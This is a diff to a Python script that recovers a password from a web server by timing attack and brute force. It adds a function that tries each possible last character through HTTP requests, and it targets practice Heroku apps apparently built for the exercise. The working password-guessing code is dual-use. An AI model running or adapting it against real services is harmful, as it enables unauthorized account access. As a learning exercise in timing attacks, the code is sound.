@@ -132,21 +132,45 @@ def find_pass_len(url, MAX_LEN):
     find_pass_len(url, 10)
 
 
+def find_pass_last_char(passw, POOL):
+    """checks the password with the last char in order to clearify it is actually the correct passowrd
+
+    Args:
+        passw (string): the password without the last char
+        POOL (string): contains all the possible chars
+
+    Returns:
+        bool/str: false in case it did not find/ the password
+    """
+    for tav in POOL:
+        # put together the link
+        exe = url + '/' + (passw+tav)
+        print(f'checking for: {str(passw+tav)}')
+        r = requests.get(exe, allow_redirects=True)
+        if r.content == b'1':# if it is the password
+            print(f'password found: {str(passw+tav)}')
+            return str(passw+tav)
+    # if it couldn't find the password
+    print("couldn't detect password")
+    return False
+
+
 if __name__ == '__main__':
     GAL_SITE = True
 
     if GAL_SITE:
-        url = "https://agamhacks.herokuapp.com"
-        POOL = 'lsaodgerme'
+        url = "https://timing-attack-web.herokuapp.com"# קון
+        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
     else:
         url = "https://passwordserver.herokuapp.com"# https://passwordserver.herokuapp.com
 
         POOL = 'A1IHiy24U3uV'
 
-
-    pswd_len = 4
+    
+    pswd_len = find_pass_len(url, 6)
     final_pass = ""
-    for num in range(4):
+    for num in range(pswd_len-1):
         final_pass += find_tav(final_pass, POOL)
+    find_pass_last_char(final_pass, POOL)
     print(final_pass)
